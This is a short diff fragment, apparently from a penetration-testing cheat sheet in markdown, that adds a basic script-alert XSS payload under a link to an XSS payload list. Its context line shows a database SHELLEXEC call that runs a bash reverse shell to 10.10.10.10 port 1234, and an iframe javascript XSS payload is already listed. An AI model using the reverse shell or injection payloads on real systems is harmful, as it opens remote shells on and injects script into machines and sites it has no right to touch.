@@ -64,6 +64,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
 	- `<iframe src="javascript:alert('xss')">`
+ 	- `<script>alert(‘XSS’)</script>`
  
 ---
  
